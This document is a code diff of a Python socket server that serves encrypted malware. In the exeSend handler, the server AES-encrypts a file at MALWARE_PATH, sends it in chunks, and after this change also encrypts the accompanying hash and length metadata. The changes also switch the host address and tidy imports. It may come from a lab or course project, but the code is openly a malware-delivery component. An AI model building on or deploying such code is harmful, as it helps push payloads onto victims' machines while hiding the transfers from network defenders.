@@ -1,17 +1,17 @@
+import hashlib
+import json
 import os
 import random
 import socket
 import threading
 
 import tqdm as tqdm
-from pyparsing import unicode
-from sympy import *
-import json
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-import pbkdf2
-import hashlib
+from sympy import *
 
-HOST = '10.0.2.5'  # Symbolic name, meaning all available interfaces
+import pbkdf2
+
+HOST = '127.0.0.1'  # Symbolic name, meaning all available interfaces
 PORT = 65432  # Arbitrary non-privileged port
 MAX_BUFFER_SIZE = 4096
 DH_KEY_LENGTH = 1024
@@ -87,7 +87,12 @@ def prepare_malware_data(aes_key):
     
     split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)
 
-    return split_data, hash_original_text, len(cipher_text)
+    response = {"Operation": "exeHash", "Hash": hash_original_text, "DataLength": len(cipher_text)}
+    response_bytes = bytes(json.dumps(response), encoding="utf-8")
+
+    encrypted_metadata = encryptor.update(pad_data(response_bytes)) + encryptor.finalize()
+
+    return split_data, encrypted_metadata
 
 
 def listen_to_client(client_socket, client_address):
@@ -139,24 +144,22 @@ def listen_to_client(client_socket, client_address):
                 end_request = True
         elif operation == "exeSend" and malware_requests < MAX_MALWARE_REQUESTS:
             malware_requests += 1
-            malware_data, malware_hash, malware_size = prepare_malware_data(aes_key)
+            malware_data, encrypted_response = prepare_malware_data(aes_key)
 
-            print(f"Sending malware hash to {format_address(client_address)}")
-            response = {"Operation": "exeHash", "Hash": malware_hash, "DataLength": malware_size}
-            client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
+            print(f"Sending malware metadata to {format_address(client_address)}")
+            client_socket.sendall(encrypted_response)
 
             progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH} to {format_address(client_address)}",
                                  unit="B", unit_scale=True, unit_divisor=FILE_SIZE / 100)
 
-            print(f"Sending encrypted executable to {format_address(client_address)}")
+            print(f"Sending encrypted malware to {format_address(client_address)}")
             for data in malware_data:
                 client_socket.sendall(data)
                 progress.update(len(data))
 
-            print(f"Encrypted executable sent to {format_address(client_address)}")
+            print(f"Encrypted malware sent to {format_address(client_address)}")
         elif operation == "endRequest" or malware_requests >= MAX_MALWARE_REQUESTS:
             if malware_requests >= MAX_MALWARE_REQUESTS:
-
                 print(f"Maximum amount of malware requests exceeded for {format_address(client_address)} -> operation {format_address(operation)}")
             end_request = True
         else:
